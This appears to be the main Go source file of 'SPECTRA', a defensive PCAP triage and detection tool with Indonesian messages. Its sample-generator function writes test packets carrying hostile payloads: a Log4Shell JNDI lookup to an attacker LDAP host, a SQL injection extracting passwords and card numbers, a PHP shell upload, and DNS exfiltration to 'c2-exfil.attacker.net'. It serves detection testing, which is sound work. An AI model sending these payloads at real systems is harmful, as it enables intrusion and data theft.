package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"spectra/internal/analyzer"
	"spectra/internal/pcap"
	"spectra/internal/report"
	"spectra/internal/server"
	"spectra/internal/sshserver"
)

func main() {
	webCmd := flag.Bool("web", true, "Jalankan Dashboard Web Taktis & SSH Gateway")
	port := flag.Int("port", 8888, "Port untuk Web UI")
	sshPort := flag.Int("ssh-port", 2222, "Port untuk SSH Tactical Gateway")
	cliFile := flag.String("file", "", "Path ke file PCAP untuk analisis via CLI")
	generateSample := flag.String("gen-attack-pcap", "", "Hasilkan file PCAP sampel serangan (contoh: -gen-attack-pcap demo.pcap)")
	liveCapture := flag.Bool("live", false, "Jalankan live packet capture langsung dari network interface")
	liveDuration := flag.String("live-duration", "10s", "Durasi live capture (contoh: 10s, 30s)")
	benchmark := flag.Bool("benchmark", false, "Jalankan benchmark stress-test performa parsing & throughput SPECTRA")
	flag.Parse()

	if *benchmark {
		runBenchmark()
		return
	}

	if *liveCapture {
		dur, err := time.ParseDuration(*liveDuration)
		if err != nil {
			dur = 10 * time.Second
		}
		runLiveCapture(dur)
		return
	}

	if *generateSample != "" {
		fmt.Printf("[+] Menghasilkan file PCAP sampel serangan (Multi-Vector) ke: %s\n", *generateSample)
		err := generateRealisticAttackPCAP(*generateSample)
		if err != nil {
			fmt.Printf("[-] Gagal menghasilkan PCAP: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[✓] File %s berhasil dibuat! Memuat serangan Log4Shell, SQLi, RCE, Port Scan, dan DNS Exfiltration.\n", *generateSample)
		return
	}

	if *cliFile != "" {
		runCLI(*cliFile)
		return
	}

	if *webCmd {
		// Jalankan SSH Tactical Gateway di background
		sshSrv := sshserver.NewSSHServer(*sshPort)
		go func() {
			if err := sshSrv.Start(); err != nil {
				fmt.Printf("[-] Gagal menjalankan SSH Gateway: %v\n", err)
			}
		}()

		srv := server.NewServer(*port)
		if err := srv.Start(); err != nil {
			fmt.Printf("Gagal menjalankan server: %v\n", err)
			os.Exit(1)
		}
	}
}

func runBenchmark() {
	fmt.Printf("\n================================================================================\n")
	fmt.Printf("   SPECTRA // BENCHMARKING & ENGINE STRESS-TEST SUITE                           \n")
	fmt.Printf("   Pure Go Zero-CGo Parser & Threat Analysis Throughput Evaluation               \n")
	fmt.Printf("================================================================================\n")

	samplePath := "attack_sample.pcap"
	if _, err := os.Stat(samplePath); os.IsNotExist(err) {
		fmt.Println("[*] Menyiapkan sampel benchmark attack_sample.pcap...")
		_ = generateRealisticAttackPCAP(samplePath)
	}

	iterations := 1000
	fmt.Printf("[*] Menjalankan stress-test %d iterasi parsing + evaluasi signature...\n", iterations)

	runtime.GC()
	var mStart runtime.MemStats
	runtime.ReadMemStats(&mStart)

	start := time.Now()
	engine := analyzer.NewEngine()

	var totalPackets int64
	var totalBytes int64

	for i := 0; i < iterations; i++ {
		packets, bytesCount, hash, err := pcap.ParsePCAPFile(samplePath)
		if err != nil {
			fmt.Printf("[-] Error parsing: %v\n", err)
			return
		}
		totalPackets += int64(len(packets))
		totalBytes += bytesCount
		_ = engine.Analyze("bench.pcap", hash, packets, bytesCount, time.Now())
	}

	elapsed := time.Since(start)
	var mEnd runtime.MemStats
	runtime.ReadMemStats(&mEnd)

	elapsedSec := elapsed.Seconds()
	mbProcessed := float64(totalBytes) / (1024.0 * 1024.0)
	throughputMBps := mbProcessed / elapsedSec
	pktsPerSec := float64(totalPackets) / elapsedSec
	avgPerIterationMicro := float64(elapsed.Microseconds()) / float64(iterations)

	fmt.Printf("\n--- HASIL BENCHMARK SPECTRA ENGINE ---\n")
	fmt.Printf("  • Total Iterasi Selesai  : %d kali\n", iterations)
	fmt.Printf("  • Total Waktu Eksekusi   : %v (%.2f ms)\n", elapsed, float64(elapsed.Microseconds())/1000.0)
	fmt.Printf("  • Rata-rata per Analisis : %.2f µs (%.3f ms)\n", avgPerIterationMicro, avgPerIterationMicro/1000.0)
	fmt.Printf("  • Total Paket Diproses   : %d paket\n", totalPackets)
	fmt.Printf("  • Throughput Paket       : %.2f paket / detik\n", pktsPerSec)
	fmt.Printf("  • Throughput Data Bandwidth: %.2f MB/s\n", throughputMBps)
	fmt.Printf("\n--- TELEMETRI MEMORI RUNTIME GO ---\n")
	fmt.Printf("  • Active Heap Alloc      : %.2f MB\n", float64(mEnd.Alloc)/(1024.0*1024.0))
	fmt.Printf("  • Cumulative Total Alloc : %.2f MB\n", float64(mEnd.TotalAlloc)/(1024.0*1024.0))
	fmt.Printf("  • System Memory (Sys)    : %.2f MB\n", float64(mEnd.Sys)/(1024.0*1024.0))
	fmt.Printf("  • Total GC Cycles Run    : %d cycles (Pause: %v)\n", mEnd.NumGC-mStart.NumGC, time.Duration(mEnd.PauseTotalNs-mStart.PauseTotalNs))
	fmt.Printf("================================================================================\n\n")
}

func runLiveCapture(duration time.Duration) {
	fmt.Printf("\n[*] SPECTRA Live Sniffing // Menangkap lalu lintas jaringan selama %v...\n", duration)
	liveEngine := pcap.NewLiveCaptureEngine()
	pcapBytes, count, err := liveEngine.CaptureLivePCAP(duration)
	if err != nil {
		fmt.Printf("\n[-] Peringatan Live Capture: %v\n", err)
		fmt.Println("[*] Tips: Pastikan menjalankan terminal dengan hak akses Administrator (Windows) atau Root (Linux).")
		return
	}

	fmt.Printf("[+] Berhasil menangkap %d paket langsung dari interface.\n", count)
	start := time.Now()
	packets, totalBytes, sha256Hex, err := pcap.ParsePCAPBytes(pcapBytes)
	if err != nil {
		fmt.Printf("[-] Gagal mem-parse paket: %v\n", err)
		return
	}

	engine := analyzer.NewEngine()
	res := engine.Analyze("live_traffic.pcap", sha256Hex, packets, totalBytes, start)

	fmt.Printf("\n================ HASIL TRIASE LIVE TRAFFIC ================\n")
	fmt.Printf("Total Paket    : %d paket (%.2f KB)\n", res.TotalPackets, float64(res.TotalBytes)/1024.0)
	fmt.Printf("Threat Score   : %d/100 [%s]\n", res.ThreatScore, res.ThreatLevel)
	fmt.Printf("Ringkasan      : %s\n", res.ExecutiveSummary)
	fmt.Printf("IOC Terdeteksi : %d temuan\n", len(res.Indicators))
	for idx, ioc := range res.Indicators {
		fmt.Printf("  [%d] %-8s | %s (%s)\n", idx+1, ioc.Severity, ioc.Title, ioc.MitreAttack)
	}
}

func runCLI(filePath string) {
	fmt.Printf("[*] SPECTRA CLI Triage // Menganalisis: %s\n", filePath)
	start := time.Now()

	packets, totalBytes, sha256Hex, err := pcap.ParsePCAPFile(filePath)
	if err != nil {
		fmt.Printf("[-] Gagal mem-parse PCAP: %v\n", err)
		os.Exit(1)
	}

	engine := analyzer.NewEngine()
	res := engine.Analyze(filepath.Base(filePath), sha256Hex, packets, totalBytes, start)

	fmt.Printf("\n================ HASIL TRIASE FORENSIK TAKTIS ================\n")
	fmt.Printf("File Target    : %s\n", res.TargetFileName)
	fmt.Printf("SHA-256 Hash   : %s\n", res.SHA256Checksum)
	fmt.Printf("Waktu Triase   : %s\n", res.AnalysisDuration)
	fmt.Printf("Total Paket    : %d paket (%.2f KB)\n", res.TotalPackets, float64(res.TotalBytes)/1024.0)
	fmt.Printf("Threat Score   : %d/100 [%s]\n", res.ThreatScore, res.ThreatLevel)
	fmt.Printf("Ringkasan      : %s\n", res.ExecutiveSummary)
	fmt.Printf("Statistik      : TCP: %d | UDP: %d | DNS: %d | HTTP: %d | ICMP: %d\n",
		res.ProtocolStats.TCPCount, res.ProtocolStats.UDPCount, res.ProtocolStats.DNSCount, res.ProtocolStats.HTTPCount, res.ProtocolStats.ICMPCount)

	fmt.Printf("\n--- INDIKATOR SERANGAN TERDETEKSI (%d) ---\n", len(res.Indicators))
	for idx, ioc := range res.Indicators {
		fmt.Printf("[%d] %-8s | %-40s | %s\n", idx+1, ioc.Severity, ioc.Title, ioc.MitreAttack)
		fmt.Printf("    Tindakan: %s\n", ioc.Recommendation)
	}

	if res.MaxEntropy > 0 {
		fmt.Printf("\n[🔬] Analisis Entropi Shannon : Max: %.3f/8.0 | Avg: %.3f/8.0\n", res.MaxEntropy, res.AvgEntropy)
	}

	if len(res.BlocklistRules.AttackerIPs) > 0 {
		fmt.Printf("\n[🛡️] Mitigasi Blocklist (%d Attacker IP):\n", len(res.BlocklistRules.AttackerIPs))
		for _, ip := range res.BlocklistRules.AttackerIPs {
			fmt.Printf("    • iptables -A INPUT -s %s -j DROP\n", ip)
		}
	}

	report.ExportJSON(res, "triage_result.json")
	report.GenerateTacticalHTMLDossier(res, "triage_dossier.html")
	fmt.Printf("\n[✓] Laporan berhasil diekspor: triage_result.json & triage_dossier.html\n")
}

func generateRealisticAttackPCAP(outputPath string) error {
	f, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer f.Close()

	gh := pcap.GlobalHeader{
		MagicNumber:  0xa1b2c3d4,
		VersionMajor: 2,
		VersionMinor: 4,
		SnapLen:      65535,
		Network:      1,
	}
	binary.Write(f, binary.LittleEndian, &gh)

	now := uint32(time.Now().Unix())

	writePacket := func(data []byte) {
		rh := pcap.RecordHeader{
			TsSec:   now,
			TsUsec:  1000,
			InclLen: uint32(len(data)),
			OrigLen: uint32(len(data)),
		}
		binary.Write(f, binary.LittleEndian, &rh)
		f.Write(data)
		now += 1
	}

	// 1. Port Scan (Reconnaissance)
	for port := uint16(20); port <= uint16(30); port++ {
		writePacket(buildTCPPacket("10.0.0.5", "192.168.1.100", 54321, port, true, false, nil))
	}

	// 2. Log4Shell Zero-Day Exploitation (CVE-2021-44228)
	log4jPayload := []byte("GET /login?user=${jndi:ldap://10.0.0.5:1389/Exploit} HTTP/1.1\r\nHost: target.internal\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
	writePacket(buildTCPPacket("10.0.0.5", "192.168.1.100", 54322, 8080, false, true, log4jPayload))

	// 3. SQL Injection Attempt
	sqliPayload := []byte("POST /api/auth HTTP/1.1\r\nHost: target.internal\r\n\r\nusername=admin' UNION SELECT 1,password,credit_card FROM users--\r\n")
	writePacket(buildTCPPacket("10.0.0.5", "192.168.1.100", 54323, 80, false, true, sqliPayload))

	// 4. Remote Command Execution Payload
	rcePayload := []byte("POST /upload HTTP/1.1\r\nHost: target.internal\r\n\r\n<?php system('/bin/sh -i'); ?>\r\n")
	writePacket(buildTCPPacket("10.0.0.5", "192.168.1.100", 54324, 80, false, true, rcePayload))

	// 5. DNS Exfiltration / Tunneling
	writePacket(buildDNSPacket("10.0.0.5", "8.8.8.8", "ZXhlY3V0aXZlX2ZpbmFuY2lhbF9jb25maWRlbnRpYWw.c2-exfil.attacker.net"))

	return nil
}

func buildTCPPacket(srcIP, dstIP string, srcPort, dstPort uint16, syn, ack bool, payload []byte) []byte {
	totalLen := 14 + 20 + 20 + len(payload)
	pkt := make([]byte, totalLen)

	pkt[12] = 0x08
	pkt[13] = 0x00

	pkt[14] = 0x45
	binary.BigEndian.PutUint16(pkt[16:18], uint16(20+20+len(payload)))
	pkt[23] = 6
	copy(pkt[26:30], parseIP(srcIP))
	copy(pkt[30:34], parseIP(dstIP))

	tcpOffset := 34
	binary.BigEndian.PutUint16(pkt[tcpOffset:tcpOffset+2], srcPort)
	binary.BigEndian.PutUint16(pkt[tcpOffset+2:tcpOffset+4], dstPort)
	pkt[tcpOffset+12] = 0x50

	var flags byte
	if syn {
		flags |= 0x02
	}
	if ack {
		flags |= 0x10
	}
	pkt[tcpOffset+13] = flags

	if len(payload) > 0 {
		copy(pkt[tcpOffset+20:], payload)
	}

	return pkt
}

func buildDNSPacket(srcIP, dstIP string, queryDomain string) []byte {
	totalLen := 14 + 20 + 8 + 12 + len(queryDomain) + 6
	pkt := make([]byte, totalLen)

	pkt[12] = 0x08
	pkt[13] = 0x00

	pkt[14] = 0x45
	binary.BigEndian.PutUint16(pkt[16:18], uint16(totalLen-14))
	pkt[23] = 17
	copy(pkt[26:30], parseIP(srcIP))
	copy(pkt[30:34], parseIP(dstIP))

	udpOffset := 34
	binary.BigEndian.PutUint16(pkt[udpOffset:udpOffset+2], 53535)
	binary.BigEndian.PutUint16(pkt[udpOffset+2:udpOffset+4], 53)
	binary.BigEndian.PutUint16(pkt[udpOffset+4:udpOffset+6], uint16(totalLen-34))

	dnsOffset := 42
	binary.BigEndian.PutUint16(pkt[dnsOffset:dnsOffset+2], 0x1234)
	binary.BigEndian.PutUint16(pkt[dnsOffset+4:dnsOffset+6], 1)

	qOffset := dnsOffset + 12
	labels := splitDomain(queryDomain)
	for _, l := range labels {
		pkt[qOffset] = byte(len(l))
		qOffset++
		copy(pkt[qOffset:], []byte(l))
		qOffset += len(l)
	}
	pkt[qOffset] = 0
	qOffset++
	binary.BigEndian.PutUint16(pkt[qOffset:qOffset+2], 1)
	binary.BigEndian.PutUint16(pkt[qOffset+2:qOffset+4], 1)

	return pkt
}

func parseIP(ipStr string) []byte {
	ip := net.ParseIP(ipStr).To4()
	if ip != nil {
		return ip
	}
	return []byte{0, 0, 0, 0}
}

func splitDomain(d string) []string {
	var res []string
	cur := ""
	for i := 0; i < len(d); i++ {
		if d[i] == '.' {
			if len(cur) > 0 {
				res = append(res, cur)
				cur = ""
			}
		} else {
			cur += string(d[i])
		}
	}
	if len(cur) > 0 {
		res = append(res, cur)
	}
	return res
}
